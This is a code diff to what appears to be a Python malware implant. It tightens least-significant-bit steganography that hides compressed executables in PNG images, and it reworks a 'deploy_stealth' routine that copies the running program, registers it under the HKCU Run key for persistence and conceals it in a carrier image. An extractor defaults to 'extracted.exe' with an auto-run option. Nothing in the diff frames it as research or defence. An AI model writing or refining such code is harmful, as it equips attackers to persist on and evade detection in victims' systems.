@@ -325,8 +325,15 @@ def hide_file_in_image(payload_path, carrier_path, output_path):
       to_hide = len(compressed).to_bytes(4, 'big') + compressed + b"###END###"
       binary = ''.join(format(byte, '08b') for byte in to_hide)
 
-      img = Image.open(carrier_path)
+      # Ensure carrier image is RGB to simplify embedding and capacity calculation
+      img = Image.open(carrier_path).convert('RGB')
       data = np.array(img)
+
+      # Capacity in bits (3 channels per pixel)
+      capacity = data.shape[0] * data.shape[1] * 3
+      if len(binary) > capacity:
+        print(f"[-] Carrier image too small: need {len(binary)} bits, capacity {capacity} bits")
+        return False
 
       idx = 0
       for i in range(data.shape[0]):
@@ -335,10 +342,10 @@ def hide_file_in_image(payload_path, carrier_path, output_path):
             if idx < len(binary):
               data[i, j, k] = (data[i, j, k] & ~1) | int(binary[idx])
               idx += 1
-            else:
-              break
-          if idx >= len(binary): break
-        if idx >= len(binary): break
+          if idx >= len(binary):
+            break
+        if idx >= len(binary):
+          break
 
       Image.fromarray(data).save(output_path, format="PNG")
       print(f"[+] Payload hidden in {output_path} ({len(compressed)/1024:.1f} KB compressed)")
@@ -408,12 +415,16 @@ def extract_from_image(image_path, output_filename="extracted.exe", auto_run=Fal
 # 1. Copy current executable to new location with new name
 # 2. Add new copy path to HKCU Run key
 # 3. Hide the new copy inside the carrier image
-def deploy_stealth(new_name, target_path, carrier_img, sock):
+
+def deploy_stealth(new_name, target_dir, carrier_img, sock):
   try:
     original_path = os.path.abspath(sys.argv[0])
-    
+
+    # Build full target path from provided directory + new_name
+    target_dir = os.path.abspath(target_dir)
+    target_path = os.path.join(target_dir, new_name)
+
     # Ensure target directory exists
-    target_dir = os.path.dirname(target_path)
     if target_dir:
       os.makedirs(target_dir, exist_ok=True)
 
